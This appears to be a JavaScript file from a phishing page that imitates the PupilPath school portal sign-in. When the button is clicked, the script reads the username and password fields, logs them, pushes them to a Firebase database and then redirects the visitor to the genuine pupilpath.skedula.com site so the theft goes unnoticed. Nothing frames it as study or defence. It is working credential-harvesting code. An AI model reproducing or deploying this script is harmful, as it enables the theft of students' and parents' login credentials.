const username = document.getElementById("user_username")
const password = document.getElementById("user_password")
const signInButton = document.getElementById("sign_in")
const database = firebase.database().ref()
signInButton.addEventListener("click", saveInfo)

function saveInfo() {
    event.preventDefault()
    console.log(`Username ${username.value} \n Password ${password.value}`)
    database.push(`Username ${username.value} `+ `Password ${password.value}`)
    location.replace("https://pupilpath.skedula.com/")
}
